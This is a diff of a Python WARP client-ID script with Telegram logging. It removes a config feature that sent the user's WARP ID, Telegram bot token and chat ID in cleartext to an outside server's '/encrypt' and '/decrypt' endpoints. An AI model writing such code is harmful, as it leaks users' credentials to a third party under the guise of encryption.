@@ -1,8 +1,7 @@
 import asyncio
 import os
 import urllib.request
-import httpx, requests as req
-import json
+import httpx
 
 from config import Vars, log
 from datetime import datetime
@@ -16,60 +15,24 @@ from nest_asyncio import apply
 
 # Default
 HIDE_ID = "0"
-API = 'https://text.drgraph.cf'
-use_config = False
-config_file = 'config.json'
 
-
-if os.path.exists(config_file):
-	r = input('Found previous session values, do you want to continue with them?\n 1 = Yes or 0 = No\n->')
-	if r in ['1','Y','y']:
-		log.info(f"Retriving & decrypting values from {config_file} file...")
-		with open(config_file,'r') as json_data:
-			config = json.load(json_data)
-			referrer = req.post(f'{API}/decrypt', json={"string":config['WARP_ID']}).json()['result']
-			SEND_LOG = config['SEND_LOG']
-			if SEND_LOG == '1':
-				CHANNEL_ID = req.post(f'{API}/decrypt', json={"string":config['CHAT_ID']}).json()['result']
-				BOT_TOKEN = req.post(f'{API}/decrypt', json={"string":config['BOT_TOKEN']}).json()['result']
-				HIDE_ID = req.post(f'{API}/decrypt', json={"string":config['HIDE_ID']}).json()['result']
-		use_config = True
-
-if Vars[5] == True and use_config == False:
+if Vars[5] == True:
   while True:
-    referrer = input("Enter WARP CLIENT ID:\n->")
+    referrer = input("Enter WARP CLIENT ID:\n")
     resp = input(
-      f"ID:{referrer}\nDo you want to continue with this ID? 1 = Yes or 0 = No\n->"
+      f"ID:{referrer}\nDo you want to continue with this ID? 1 = Yes or 0 = No\n"
     )
     if resp == "1":
       break
-  SEND_LOG = input("Do you want to get log on Telegram? 1 = Yes or 0 = No\n->")
-  log.info(f"Encrypting & Saving values in {config_file}...")
+  SEND_LOG = input("Do you want to get log on Telegram? 1 = Yes or 0 = No\n")
   if SEND_LOG == "1":
     CHANNEL_ID = input(
-      "Enter CHAT ID, in which you want log message to be sent:\n->")
+      "Enter CHAT ID, in which you want log message to be sent:\n")
     BOT_TOKEN = input(
-      "Enter BOT_TOKEN, through which log message will be sent:\n->")
+      "Enter BOT_TOKEN, through which log message will be sent:\n")
     HIDE_ID = input(
-      "Do you want to hide WARP CLIENT ID in log message? 1 = Yes or 0 = No:\n->"
+      "Do you want to hide WARP CLIENT ID in log message? 1 = Yes or 0 = No:\n"
     )
-    # Save config
-    e_referrer = req.post(f'{API}/encrypt', json={"string":referrer}).json()['result']
-    e_CHANNEL_ID =  req.post(f'{API}/encrypt', json={"string":CHANNEL_ID}).json()['result']
-    e_BOT_TOKEN = req.post(f'{API}/encrypt', json={"string":BOT_TOKEN}).json()['result']
-    e_HIDE_ID = req.post(f'{API}/encrypt', json={"string":HIDE_ID}).json()['result']
-    with open(config_file,'w') as config:
-    	config.write('{' + f'"WARP_ID":"{e_referrer}",' + '"SEND_LOG":"1",' + f'"CHAT_ID":"{e_CHANNEL_ID}",' + f'"BOT_TOKEN":"{e_BOT_TOKEN}",' + f'"HIDE_ID":"{HIDE_ID}"' + '}')
-    	config.close()
-  else:
-  	e_referrer = req.post(f'{API}/encrypt', json={"string":referrer}).json()['result']
-  	with open(config_file,'w') as config:
-  		config.write('{' + f'"WARP_ID":"{e_referrer}",' + '"SEND_LOG":"0"' + '}')
-  		config.close()
-
-elif Vars[5] == True and use_config == True:
-	log.info("Retrived values from config file.")
-
 else:
   referrer = Vars[0]
   SEND_LOG = Vars[1]
